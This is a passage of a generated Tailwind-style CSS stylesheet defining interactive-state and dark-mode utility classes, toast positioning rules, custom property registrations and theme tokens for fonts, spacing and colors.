                .not-placeholder-shown\:text-primary {
                    &:not(:placeholder-shown) {
                        color: var(--color-neutral-900);

                        .dark & {
                            color: var(--color-neutral-0)
                        }
                    }
                }

                .group-hover\:text-accent-active {
                    &:is(:where(.group):hover *) {
                        @media (hover:hover) {
                            color: var(--color-blue-700);

                            .dark & {
                                color: var(--color-blue-400)
                            }
                        }
                    }
                }

                .group-hover\:text-secondary {
                    &:is(:where(.group):hover *) {
                        @media (hover:hover) {
                            color: var(--color-neutral-600);

                            .dark & {
                                color: var(--color-neutral-500)
                            }
                        }
                    }
                }

                .group-data-open\:rotate-180 {
                    &:is(:where(.group)[data-open] *) {
                        rotate: 180deg
                    }
                }

                .group-data-\[invalid\=true\]\/radio-group\:border-critical\! {
                    &:is(:where(.group\/radio-group)[data-invalid=true] *) {
                        border-color: var(--color-red-400) !important;

                        .dark & {
                            border-color: var(--color-red-600) !important
                        }
                    }
                }

                .peer-placeholder-shown\:hidden {
                    &:is(:where(.peer):placeholder-shown~*) {
                        display: none
                    }
                }

                .placeholder\:text-disabled {
                    &::placeholder {
                        color: var(--color-neutral-400);

                        .dark & {
                            color: var(--color-neutral-700)
                        }
                    }
                }

                .placeholder\:text-placeholder {
                    &::placeholder {
                        color: var(--color-neutral-600);

                        .dark & {
                            color: var(--color-neutral-400)
                        }
                    }
                }

                .placeholder\:text-secondary {
                    &::placeholder {
                        color: var(--color-neutral-600);

                        .dark & {
                            color: var(--color-neutral-500)
                        }
                    }
                }

                .after\:size-1\.5 {
                    &:after {
                        content: var(--tw-content);
                        width: calc(var(--spacing)*1.5);
                        height: calc(var(--spacing)*1.5)
                    }
                }

                .after\:rounded-full {
                    &:after {
                        content: var(--tw-content);
                        border-radius: var(--borderRadius-full)
                    }
                }

                .after\:bg-neutral-0 {
                    &:after {
                        content: var(--tw-content);
                        background-color: var(--color-neutral-0)
                    }
                }

                .after\:opacity-0 {
                    &:after {
                        content: var(--tw-content);
                        opacity: 0
                    }
                }

                .after\:transition-opacity {
                    &:after {
                        content: var(--tw-content);
                        transition-property: opacity;
                        transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                        transition-duration: var(--tw-duration, var(--default-transition-duration))
                    }
                }

                .after\:content-\[\'\'\] {
                    &:after {
                        --tw-content: "";
                        content: var(--tw-content)
                    }
                }

                .focus-within\:border-accent {
                    &:focus-within {
                        border-color: var(--color-blue-600);

                        .dark & {
                            border-color: var(--color-blue-600)
                        }
                    }
                }

                .hover\:border-accent {
                    &:hover {
                        @media (hover:hover) {
                            border-color: var(--color-blue-600);

                            .dark & {
                                border-color: var(--color-blue-600)
                            }
                        }
                    }
                }

                .hover\:bg-accent-active {
                    &:hover {
                        @media (hover:hover) {
                            background-color: var(--color-blue-700);

                            .dark & {
                                background-color: var(--color-blue-700)
                            }
                        }
                    }
                }

                .hover\:bg-primary {
                    &:hover {
                        @media (hover:hover) {
                            background-color: var(--color-neutral-100);

                            .dark & {
                                background-color: var(--color-neutral-1000)
                            }
                        }
                    }
                }

                .hover\:bg-secondary {
                    &:hover {
                        @media (hover:hover) {
                            background-color: var(--color-neutral-0);

                            .dark & {
                                background-color: var(--color-neutral-950)
                            }
                        }
                    }
                }

                .hover\:bg-tertiary {
                    &:hover {
                        @media (hover:hover) {
                            background-color: var(--color-neutral-150);

                            .dark & {
                                background-color: var(--color-neutral-900)
                            }
                        }
                    }
                }

                .hover\:bg-transparent {
                    &:hover {
                        @media (hover:hover) {
                            background-color: transparent
                        }
                    }
                }

                .hover\:text-accent-active {
                    &:hover {
                        @media (hover:hover) {
                            color: var(--color-blue-700);

                            .dark & {
                                color: var(--color-blue-400)
                            }
                        }
                    }
                }

                .hover\:text-secondary {
                    &:hover {
                        @media (hover:hover) {
                            color: var(--color-neutral-600);

                            .dark & {
                                color: var(--color-neutral-500)
                            }
                        }
                    }
                }

                .not-disabled\:hover\:border-accent-active {
                    &:not(:disabled) {
                        &:hover {
                            @media (hover:hover) {
                                border-color: var(--color-blue-700);

                                .dark & {
                                    border-color: var(--color-blue-700)
                                }
                            }
                        }
                    }
                }

                .not-disabled\:hover\:border-transparent {
                    &:not(:disabled) {
                        &:hover {
                            @media (hover:hover) {
                                border-color: transparent
                            }
                        }
                    }
                }

                .not-disabled\:hover\:bg-accent-active {
                    &:not(:disabled) {
                        &:hover {
                            @media (hover:hover) {
                                background-color: var(--color-blue-700);

                                .dark & {
                                    background-color: var(--color-blue-700)
                                }
                            }
                        }
                    }
                }

                .not-disabled\:hover\:bg-accent-subtle {
                    &:not(:disabled) {
                        &:hover {
                            @media (hover:hover) {
                                background-color: var(--color-blue-100);

                                .dark & {
                                    background-color: var(--color-blue-950)
                                }
                            }
                        }
                    }
                }

                .not-disabled\:hover\:bg-critical-subtle {
                    &:not(:disabled) {
                        &:hover {
                            @media (hover:hover) {
                                background-color: var(--color-red-100);

                                .dark & {
                                    background-color: var(--color-red-950)
                                }
                            }
                        }
                    }
                }

                .not-disabled\:hover\:bg-primary {
                    &:not(:disabled) {
                        &:hover {
                            @media (hover:hover) {
                                background-color: var(--color-neutral-100);

                                .dark & {
                                    background-color: var(--color-neutral-1000)
                                }
                            }
                        }
                    }
                }

                .not-disabled\:hover\:bg-red-700 {
                    &:not(:disabled) {
                        &:hover {
                            @media (hover:hover) {
                                background-color: var(--color-red-700)
                            }
                        }
                    }
                }

                .focus\:outline-hidden {
                    &:focus {
                        --tw-outline-style: none;
                        outline-style: none;

                        @media (forced-colors:active) {
                            outline: 2px solid transparent;
                            outline-offset: 2px
                        }
                    }
                }

                .focus-visible\:border-accent {
                    &:focus-visible {
                        border-color: var(--color-blue-600);

                        .dark & {
                            border-color: var(--color-blue-600)
                        }
                    }
                }

                .focus-visible\:shadow-focus {
                    &:focus-visible {
                        --tw-shadow: 0px 0px 0px 2px var(--tw-shadow-color, var(--color-neutral-0)), 0px 0px 0px 4px var(--tw-shadow-color, var(--color-blue-600));
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .focus-visible\:shadow-focus-inset {
                    &:focus-visible {
                        --tw-shadow: inset 0px 0px 0px 2px var(--tw-shadow-color, var(--color-blue-600)), inset 0px 0px 0 4px var(--tw-shadow-color, var(--color-neutral-0));
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .focus-visible\:shadow-focus-inset\! {
                    &:focus-visible {
                        --tw-shadow: inset 0px 0px 0px 2px var(--tw-shadow-color, var(--color-blue-600)), inset 0px 0px 0 4px var(--tw-shadow-color, var(--color-neutral-0)) !important;
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow) !important
                    }
                }

                .focus-visible\:outline-hidden {
                    &:focus-visible {
                        --tw-outline-style: none;
                        outline-style: none;

                        @media (forced-colors:active) {
                            outline: 2px solid transparent;
                            outline-offset: 2px
                        }
                    }
                }

                .active\:border-accent {
                    &:active {
                        border-color: var(--color-blue-600);

                        .dark & {
                            border-color: var(--color-blue-600)
                        }
                    }
                }

                .active\:bg-accent {
                    &:active {
                        background-color: var(--color-blue-600);

                        .dark & {
                            background-color: var(--color-blue-600)
                        }
                    }
                }

                .active\:bg-glass {
                    &:active {
                        background-color: #f7f7f8b3;

                        .dark & {
                            background-color: #141415b3
                        }
                    }
                }

                .active\:bg-primary {
                    &:active {
                        background-color: var(--color-neutral-100);

                        .dark & {
                            background-color: var(--color-neutral-1000)
                        }
                    }
                }

                .active\:bg-tertiary {
                    &:active {
                        background-color: var(--color-neutral-150);

                        .dark & {
                            background-color: var(--color-neutral-900)
                        }
                    }
                }

                .active\:text-accent {
                    &:active {
                        color: var(--color-blue-600);

                        .dark & {
                            color: var(--color-blue-500)
                        }
                    }
                }

                .active\:text-primary {
                    &:active {
                        color: var(--color-neutral-900);

                        .dark & {
                            color: var(--color-neutral-0)
                        }
                    }
                }

                .active\:text-secondary {
                    &:active {
                        color: var(--color-neutral-600);

                        .dark & {
                            color: var(--color-neutral-500)
                        }
                    }
                }

                .not-disabled\:active\:border-accent {
                    &:not(:disabled) {
                        &:active {
                            border-color: var(--color-blue-600);

                            .dark & {
                                border-color: var(--color-blue-600)
                            }
                        }
                    }
                }

                .not-disabled\:active\:border-primary {
                    &:not(:disabled) {
                        &:active {
                            border-color: var(--color-neutral-300);

                            .dark & {
                                border-color: var(--color-neutral-700)
                            }
                        }
                    }
                }

                .not-disabled\:active\:border-transparent {
                    &:not(:disabled) {
                        &:active {
                            border-color: transparent
                        }
                    }
                }

                .not-disabled\:active\:bg-accent {
                    &:not(:disabled) {
                        &:active {
                            background-color: var(--color-blue-600);

                            .dark & {
                                background-color: var(--color-blue-600)
                            }
                        }
                    }
                }

                .not-disabled\:active\:bg-critical {
                    &:not(:disabled) {
                        &:active {
                            background-color: var(--color-red-600);

                            .dark & {
                                background-color: var(--color-red-700)
                            }
                        }
                    }
                }

                .not-disabled\:active\:bg-glass {
                    &:not(:disabled) {
                        &:active {
                            background-color: #f7f7f8b3;

                            .dark & {
                                background-color: #141415b3
                            }
                        }
                    }
                }

                .not-disabled\:active\:bg-tertiary {
                    &:not(:disabled) {
                        &:active {
                            background-color: var(--color-neutral-150);

                            .dark & {
                                background-color: var(--color-neutral-900)
                            }
                        }
                    }
                }

                .not-disabled\:active\:bg-transparent {
                    &:not(:disabled) {
                        &:active {
                            background-color: transparent
                        }
                    }
                }

                .disabled\:cursor-not-allowed {
                    &:disabled {
                        cursor: not-allowed
                    }
                }

                .disabled\:border-secondary {
                    &:disabled {
                        border-color: var(--color-neutral-200);

                        .dark & {
                            border-color: var(--color-neutral-800)
                        }
                    }
                }

                .disabled\:border-transparent {
                    &:disabled {
                        border-color: transparent
                    }
                }

                .disabled\:border-transparent\! {
                    &:disabled {
                        border-color: transparent !important
                    }
                }

                .disabled\:bg-primary {
                    &:disabled {
                        background-color: var(--color-neutral-100);

                        .dark & {
                            background-color: var(--color-neutral-1000)
                        }
                    }
                }

                .disabled\:bg-tertiary {
                    &:disabled {
                        background-color: var(--color-neutral-150);

                        .dark & {
                            background-color: var(--color-neutral-900)
                        }
                    }
                }

                .disabled\:bg-transparent {
                    &:disabled {
                        background-color: transparent
                    }
                }

                .disabled\:text-disabled {
                    &:disabled {
                        color: var(--color-neutral-400);

                        .dark & {
                            color: var(--color-neutral-700)
                        }
                    }
                }

                .has-data-disabled\:cursor-not-allowed {
                    &:has([data-disabled]) {
                        cursor: not-allowed
                    }
                }

                .has-\[\[data-li-row\]\:focus-visible\]\:rounded-lg {
                    &:has(:is([data-li-row]:focus-visible)) {
                        border-radius: var(--borderRadius-lg)
                    }
                }

                .has-\[\[data-li-row\]\:focus-visible\]\:shadow-focus-inset {
                    &:has(:is([data-li-row]:focus-visible)) {
                        --tw-shadow: inset 0px 0px 0px 2px var(--tw-shadow-color, var(--color-blue-600)), inset 0px 0px 0 4px var(--tw-shadow-color, var(--color-neutral-0));
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .has-\[button\:focus-visible\]\:shadow-focus {
                    &:has(:is(button:focus-visible)) {
                        --tw-shadow: 0px 0px 0px 2px var(--tw-shadow-color, var(--color-neutral-0)), 0px 0px 0px 4px var(--tw-shadow-color, var(--color-blue-600));
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .aria-busy\:cursor-progress {
                    &[aria-busy=true] {
                        cursor: progress
                    }
                }

                .aria-disabled\:cursor-not-allowed {
                    &[aria-disabled=true] {
                        cursor: not-allowed
                    }
                }

                .aria-disabled\:border-transparent {
                    &[aria-disabled=true] {
                        border-color: transparent
                    }
                }

                .aria-disabled\:border-transparent\! {
                    &[aria-disabled=true] {
                        border-color: transparent !important
                    }
                }

                .aria-disabled\:bg-tertiary {
                    &[aria-disabled=true] {
                        background-color: var(--color-neutral-150);

                        .dark & {
                            background-color: var(--color-neutral-900)
                        }
                    }
                }

                .aria-disabled\:bg-transparent {
                    &[aria-disabled=true] {
                        background-color: transparent
                    }
                }

                .aria-disabled\:text-disabled {
                    &[aria-disabled=true] {
                        color: var(--color-neutral-400);

                        .dark & {
                            color: var(--color-neutral-700)
                        }
                    }
                }

                .data-checked\:border-accent {
                    &[data-checked] {
                        border-color: var(--color-blue-600);

                        .dark & {
                            border-color: var(--color-blue-600)
                        }
                    }
                }

                .data-checked\:bg-accent {
                    &[data-checked] {
                        background-color: var(--color-blue-600);

                        .dark & {
                            background-color: var(--color-blue-600)
                        }
                    }
                }

                .data-checked\:after\:opacity-100 {
                    &[data-checked] {
                        &:after {
                            content: var(--tw-content);
                            opacity: 1
                        }
                    }
                }

                .data-closed\:opacity-0 {
                    &[data-closed] {
                        opacity: 0
                    }
                }

                .data-disabled\:cursor-not-allowed {
                    &[data-disabled] {
                        cursor: not-allowed
                    }
                }

                .data-disabled\:border-primary {
                    &[data-disabled] {
                        border-color: var(--color-neutral-300);

                        .dark & {
                            border-color: var(--color-neutral-700)
                        }
                    }
                }

                .data-disabled\:bg-primary {
                    &[data-disabled] {
                        background-color: var(--color-neutral-100);

                        .dark & {
                            background-color: var(--color-neutral-1000)
                        }
                    }
                }

                .data-disabled\:text-disabled {
                    &[data-disabled] {
                        color: var(--color-neutral-400);

                        .dark & {
                            color: var(--color-neutral-700)
                        }
                    }
                }

                .data-disabled\:after\:bg-disabled {
                    &[data-disabled] {
                        &:after {
                            content: var(--tw-content);
                            background-color: var(--color-neutral-300);

                            .dark & {
                                background-color: var(--color-neutral-800)
                            }
                        }
                    }
                }

                .data-focus\:border-accent {
                    &[data-focus] {
                        border-color: var(--color-blue-600);

                        .dark & {
                            border-color: var(--color-blue-600)
                        }
                    }
                }

                .data-focus\:shadow-focus {
                    &[data-focus] {
                        --tw-shadow: 0px 0px 0px 2px var(--tw-shadow-color, var(--color-neutral-0)), 0px 0px 0px 4px var(--tw-shadow-color, var(--color-blue-600));
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .data-focus\:shadow-focus-inset {
                    &[data-focus] {
                        --tw-shadow: inset 0px 0px 0px 2px var(--tw-shadow-color, var(--color-blue-600)), inset 0px 0px 0 4px var(--tw-shadow-color, var(--color-neutral-0));
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .data-focus\:ring-2 {
                    &[data-focus] {
                        --tw-ring-shadow: var(--tw-ring-inset, )0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color, currentcolor);
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .data-focus\:ring-blue-600 {
                    &[data-focus] {
                        --tw-ring-color: var(--color-blue-600)
                    }
                }

                .data-focus\:ring-offset-2 {
                    &[data-focus] {
                        --tw-ring-offset-width: 2px;
                        --tw-ring-offset-shadow: var(--tw-ring-inset, )0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color)
                    }
                }

                .data-hover\:not-data-disabled\:not-data-checked\:border-accent {
                    &[data-hover] {
                        &:not([data-disabled]) {
                            &:not([data-checked]) {
                                border-color: var(--color-blue-600);

                                .dark & {
                                    border-color: var(--color-blue-600)
                                }
                            }
                        }
                    }
                }

                .data-open\:border-accent {
                    &[data-open] {
                        border-color: var(--color-blue-600);

                        .dark & {
                            border-color: var(--color-blue-600)
                        }
                    }
                }

                .dark\:from-neutral-900 {
                    &:where(.dark, .dark *) {
                        --tw-gradient-from: var(--color-neutral-900);
                        --tw-gradient-stops: var(--tw-gradient-via-stops, var(--tw-gradient-position), var(--tw-gradient-from) var(--tw-gradient-from-position), var(--tw-gradient-to) var(--tw-gradient-to-position))
                    }
                }

                .dark\:to-neutral-1000 {
                    &:where(.dark, .dark *) {
                        --tw-gradient-to: var(--color-neutral-1000);
                        --tw-gradient-stops: var(--tw-gradient-via-stops, var(--tw-gradient-position), var(--tw-gradient-from) var(--tw-gradient-from-position), var(--tw-gradient-to) var(--tw-gradient-to-position))
                    }
                }

                .dark\:fill-neutral-1000 {
                    &:where(.dark, .dark *) {
                        fill: var(--color-neutral-1000)
                    }
                }

                .ui-focus-visible\:shadow-focus {
                    :where([data-headlessui-focus-visible]) &:focus {
                        --tw-shadow: 0px 0px 0px 2px var(--tw-shadow-color, var(--color-neutral-0)), 0px 0px 0px 4px var(--tw-shadow-color, var(--color-blue-600));
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .\[\&_svg\]\:\!size-4 {
                    & svg {
                        width: calc(var(--spacing)*4) !important;
                        height: calc(var(--spacing)*4) !important
                    }
                }

                .\[\&_svg\]\:size-4 {
                    & svg {
                        width: calc(var(--spacing)*4);
                        height: calc(var(--spacing)*4)
                    }
                }

                .\[\&_svg\]\:size-6 {
                    & svg {
                        width: calc(var(--spacing)*6);
                        height: calc(var(--spacing)*6)
                    }
                }

                .\[\&_svg\]\:size-8 {
                    & svg {
                        width: calc(var(--spacing)*8);
                        height: calc(var(--spacing)*8)
                    }
                }

                .\[\&_svg\]\:shrink-0 {
                    & svg {
                        flex-shrink: 0
                    }
                }

                .\[\&_svg\]\:text-accent {
                    & svg {
                        color: var(--color-blue-600);

                        .dark & {
                            color: var(--color-blue-500)
                        }
                    }
                }

                .\[\&_svg\]\:text-primary {
                    & svg {
                        color: var(--color-neutral-900);

                        .dark & {
                            color: var(--color-neutral-0)
                        }
                    }
                }

                .\[\&_svg\]\:text-primary-on-color {
                    & svg {
                        color: var(--color-neutral-0);

                        .dark & {
                            color: var(--color-neutral-0)
                        }
                    }
                }

                .\[\&_svg\]\:text-secondary {
                    & svg {
                        color: var(--color-neutral-600);

                        .dark & {
                            color: var(--color-neutral-500)
                        }
                    }
                }

                .hover\:\[\&_svg\]\:text-accent-active {
                    &:hover {
                        @media (hover:hover) {
                            & svg {
                                color: var(--color-blue-700);

                                .dark & {
                                    color: var(--color-blue-400)
                                }
                            }
                        }
                    }
                }

                .hover\:\[\&_svg\]\:text-primary {
                    &:hover {
                        @media (hover:hover) {
                            & svg {
                                color: var(--color-neutral-900);

                                .dark & {
                                    color: var(--color-neutral-0)
                                }
                            }
                        }
                    }
                }

                .hover\:\[\&_svg\]\:text-primary-on-color {
                    &:hover {
                        @media (hover:hover) {
                            & svg {
                                color: var(--color-neutral-0);

                                .dark & {
                                    color: var(--color-neutral-0)
                                }
                            }
                        }
                    }
                }

                .hover\:\[\&_svg\]\:text-secondary {
                    &:hover {
                        @media (hover:hover) {
                            & svg {
                                color: var(--color-neutral-600);

                                .dark & {
                                    color: var(--color-neutral-500)
                                }
                            }
                        }
                    }
                }

                .active\:\[\&_svg\]\:text-accent {
                    &:active {
                        & svg {
                            color: var(--color-blue-600);

                            .dark & {
                                color: var(--color-blue-500)
                            }
                        }
                    }
                }

                .active\:\[\&_svg\]\:text-primary {
                    &:active {
                        & svg {
                            color: var(--color-neutral-900);

                            .dark & {
                                color: var(--color-neutral-0)
                            }
                        }
                    }
                }

                .active\:\[\&_svg\]\:text-primary-on-color {
                    &:active {
                        & svg {
                            color: var(--color-neutral-0);

                            .dark & {
                                color: var(--color-neutral-0)
                            }
                        }
                    }
                }

                .active\:\[\&_svg\]\:text-secondary {
                    &:active {
                        & svg {
                            color: var(--color-neutral-600);

                            .dark & {
                                color: var(--color-neutral-500)
                            }
                        }
                    }
                }

                .disabled\:\[\&_svg\]\:text-disabled {
                    &:disabled {
                        & svg {
                            color: var(--color-neutral-400);

                            .dark & {
                                color: var(--color-neutral-700)
                            }
                        }
                    }
                }

                .\[\&_svg\:not\(\[class\*\=\'size-\'\]\)\]\:size-6 {
                    & svg:not([class*=size-]) {
                        width: calc(var(--spacing)*6);
                        height: calc(var(--spacing)*6)
                    }
                }

                .\[\&\:\:-webkit-search-cancel-button\]\:appearance-none {
                    &::-webkit-search-cancel-button {
                        appearance: none
                    }
                }

                .\[\&\:\:-webkit-search-decoration\]\:appearance-none {
                    &::-webkit-search-decoration {
                        appearance: none
                    }
                }
            }

            @layer base {

                *,
                ::backdrop,
                ::file-selector-button,
                :after,
                :before {
                    border-color: var(--color-neutral-1000, currentColor)
                }

                [role=button]:not(:disabled),
                button:not(:disabled) {
                    cursor: pointer
                }

                b,
                strong {
                    font-weight: var(--fontWeight-bold)
                }

                body {
                    background-color: var(--color-neutral-100);
                    color: var(--color-neutral-900);
                    -webkit-font-smoothing: antialiased;
                    -moz-osx-font-smoothing: grayscale;
                    text-rendering: optimizeLegibility
                }

                .dark body {
                    background-color: var(--color-neutral-1000);
                    color: var(--color-neutral-0)
                }
            }

            @layer base {}

            [data-sonner-toast]:focus,
            [data-sonner-toast]:focus-visible {
                box-shadow: none !important
            }

            @media (max-width:600px) {
                [data-sonner-toaster][data-sonner-toaster] {
                    width: var(--width);
                    left: unset;
                    right: unset
                }

                [data-sonner-toaster][data-sonner-toaster][data-x-position=right] {
                    right: var(--offset-right)
                }

                [data-sonner-toaster][data-sonner-toaster][data-x-position=left] {
                    left: var(--offset-left)
                }

                [data-sonner-toaster][data-sonner-toaster][data-x-position=center] {
                    left: 50%;
                    transform: translate(-50%)
                }

                [data-sonner-toaster][data-sonner-toaster][data-y-position=bottom] {
                    bottom: var(--offset-bottom)
                }

                [data-sonner-toaster][data-sonner-toaster][data-y-position=top] {
                    top: var(--offset-top)
                }

                [data-sonner-toaster] [data-sonner-toast][data-sonner-toast] {
                    width: auto;
                    left: unset;
                    right: unset
                }

                [data-sonner-toaster] [data-sonner-toast][data-sonner-toast][data-x-position=right] {
                    right: 0
                }

                [data-sonner-toaster] [data-sonner-toast][data-sonner-toast][data-x-position=left] {
                    left: 0
                }
            }

            @property --tw-gradient-position {
                syntax: "*";
                inherits: false
            }

            @property --tw-gradient-from {
                syntax: "<color>";
                inherits: false;
                initial-value: #0000
            }

            @property --tw-gradient-via {
                syntax: "<color>";
                inherits: false;
                initial-value: #0000
            }

            @property --tw-gradient-to {
                syntax: "<color>";
                inherits: false;
                initial-value: #0000
            }

            @property --tw-gradient-stops {
                syntax: "*";
                inherits: false
            }

            @property --tw-gradient-via-stops {
                syntax: "*";
                inherits: false
            }

            @property --tw-gradient-from-position {
                syntax: "<length-percentage>";
                inherits: false;
                initial-value: 0%
            }

            @property --tw-gradient-via-position {
                syntax: "<length-percentage>";
                inherits: false;
                initial-value: 50%
            }

            @property --tw-gradient-to-position {
                syntax: "<length-percentage>";
                inherits: false;
                initial-value: 100%
            }

            @property --tw-content {
                syntax: "*";
                initial-value: "";
                inherits: false
            }

            @layer properties {
                @supports ((-webkit-hyphens:none) and (not (margin-trim:inline))) or ((-moz-orient:inline) and (not (color:rgb(from red r g b)))) {

                    *,
                    ::backdrop,
                    :after,
                    :before {
                        --tw-translate-x: 0;
                        --tw-translate-y: 0;
                        --tw-translate-z: 0;
                        --tw-rotate-x: initial;
                        --tw-rotate-y: initial;
                        --tw-rotate-z: initial;
                        --tw-skew-x: initial;
                        --tw-skew-y: initial;
                        --tw-border-style: solid;
                        --tw-gradient-position: initial;
                        --tw-gradient-from: #0000;
                        --tw-gradient-via: #0000;
                        --tw-gradient-to: #0000;
                        --tw-gradient-stops: initial;
                        --tw-gradient-via-stops: initial;
                        --tw-gradient-from-position: 0%;
                        --tw-gradient-via-position: 50%;
                        --tw-gradient-to-position: 100%;
                        --tw-leading: initial;
                        --tw-shadow: 0 0#0000;
                        --tw-shadow-color: initial;
                        --tw-shadow-alpha: 100%;
                        --tw-inset-shadow: 0 0#0000;
                        --tw-inset-shadow-color: initial;
                        --tw-inset-shadow-alpha: 100%;
                        --tw-ring-color: initial;
                        --tw-ring-shadow: 0 0#0000;
                        --tw-inset-ring-color: initial;
                        --tw-inset-ring-shadow: 0 0#0000;
                        --tw-ring-inset: initial;
                        --tw-ring-offset-width: 0px;
                        --tw-ring-offset-color: #fff;
                        --tw-ring-offset-shadow: 0 0#0000;
                        --tw-outline-style: solid;
                        --tw-blur: initial;
                        --tw-brightness: initial;
                        --tw-contrast: initial;
                        --tw-grayscale: initial;
                        --tw-hue-rotate: initial;
                        --tw-invert: initial;
                        --tw-opacity: initial;
                        --tw-saturate: initial;
                        --tw-sepia: initial;
                        --tw-drop-shadow: initial;
                        --tw-drop-shadow-color: initial;
                        --tw-drop-shadow-alpha: 100%;
                        --tw-drop-shadow-size: initial;
                        --tw-backdrop-blur: initial;
                        --tw-backdrop-brightness: initial;
                        --tw-backdrop-contrast: initial;
                        --tw-backdrop-grayscale: initial;
                        --tw-backdrop-hue-rotate: initial;
                        --tw-backdrop-invert: initial;
                        --tw-backdrop-opacity: initial;
                        --tw-backdrop-saturate: initial;
                        --tw-backdrop-sepia: initial;
                        --tw-duration: initial;
                        --tw-ease: initial;
                        --tw-content: "";
                        --border-angle: 0deg
                    }
                }
            }

            @layer properties;
            @layer theme,
            base,
            components,
            utilities;

            @layer theme {

                :host,
                :root {
                    --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
                    --spacing: 0.25em;
                    --text-sm: 0.875em;
                    --text-sm--line-height: 1.42857;
                    --text-2xl: 1.5em;
                    --text-2xl--line-height: 1.33333;
                    --text-3xl: 1.875em;
                    --text-3xl--line-height: 1.2;
                    --font-weight-light: 300;
                    --font-weight-normal: 400;
                    --font-weight-semibold: 600;
                    --leading-tight: 1.25;
                    --leading-relaxed: 1.625;
                    --default-transition-duration: 150ms;
                    --default-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
                    --default-font-family: "Inter", "ui-sans-serif", "system-ui", "sans-serif", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
                    --default-mono-font-family: var(--font-mono);
                    --container-md: 736px;
                    --container-lg: 960px;
                    --font-heading: "Inter", "ui-sans-serif", "system-ui", "sans-serif", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
                    --font-body: "Inter", "ui-sans-serif", "system-ui", "sans-serif", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
                    --fontSize-xs: 0.75em;
                    --fontSize-sm: 0.875em;
                    --fontSize-md: 1em;
                    --fontSize-2xl: 1.375em;
                    --fontSize-3xl: 1.5em;
                    --fontSize-4xl: 1.625em;
                    --fontSize-5xl: 1.75em;
                    --fontSize-6xl: 2em;
                    --fontSize-7xl: 2.5em;
                    --fontWeight-normal: 400;
                    --fontWeight-medium: 500;
                    --fontWeight-bold: 600;
                    --letterSpacing-sm: -0.016em;
                    --letterSpacing-md: 0em;
                    --borderRadius-xs: 3px;
                    --borderRadius-sm: 6px;
                    --borderRadius-md: 12px;
                    --borderRadius-lg: 20px;
                    --borderRadius-full: 9999px;
                    --color-neutral-0: var(--color-neutral-0);
                    --color-neutral-100: var(--color-neutral-100);
                    --color-neutral-150: var(--color-neutral-150);
                    --color-neutral-200: var(--color-neutral-200);
                    --color-neutral-300: var(--color-neutral-300);
                    --color-neutral-400: var(--color-neutral-400);
                    --color-neutral-500: var(--color-neutral-500);
                    --color-neutral-600: var(--color-neutral-600);
                    --color-neutral-700: var(--color-neutral-700);
                    --color-neutral-800: var(--color-neutral-800);
                    --color-neutral-900: var(--color-neutral-900);
                    --color-neutral-950: var(--color-neutral-950);
                    --color-neutral-1000: var(--color-neutral-1000);
                    --color-yellow-100: var(--color-yellow-100);
                    --color-yellow-200: var(--color-yellow-200);
                    --color-yellow-300: var(--color-yellow-300);
                    --color-yellow-400: var(--color-yellow-400);
                    --color-yellow-500: var(--color-yellow-500);
                    --color-yellow-600: var(--color-yellow-600);
                    --color-yellow-700: var(--color-yellow-700);
                    --color-yellow-800: var(--color-yellow-800);
                    --color-yellow-900: var(--color-yellow-900);
                    --color-yellow-950: var(--color-yellow-950);
                    --color-yellow-1000: var(--color-yellow-1000);
                    --color-blue-100: var(--color-blue-100);
                    --color-blue-200: var(--color-blue-200);
                    --color-blue-300: var(--color-blue-300);
                    --color-blue-400: var(--color-blue-400);
                    --color-blue-500: var(--color-blue-500);
                    --color-blue-600: var(--color-blue-600);
                    --color-blue-700: var(--color-blue-700);
                    --color-blue-800: var(--color-blue-800);
                    --color-blue-900: var(--color-blue-900);
                    --color-blue-950: var(--color-blue-950);
                    --color-blue-1000: var(--color-blue-1000);
                    --color-red-100: var(--color-red-100);
                    --color-red-200: var(--color-red-200);
                    --color-red-300: var(--color-red-300);
                    --color-red-400: var(--color-red-400);
                    --color-red-500: var(--color-red-500);
                    --color-red-600: var(--color-red-600);
                    --color-red-700: var(--color-red-700);
                    --color-red-800: var(--color-red-800);
                    --color-red-900: var(--color-red-900);
                    --color-red-950: var(--color-red-950);
                    --color-red-1000: var(--color-red-1000);
                    --color-green-100: var(--color-green-100);
                    --color-green-200: var(--color-green-200);
                    --color-green-300: var(--color-green-300);
                    --color-green-400: var(--color-green-400);
                    --color-green-500: var(--color-green-500);
                    --color-green-600: var(--color-green-600);
                    --color-green-700: var(--color-green-700);
                    --color-green-800: var(--color-green-800);
                    --color-green-900: var(--color-green-900);
                    --color-green-950: var(--color-green-950);
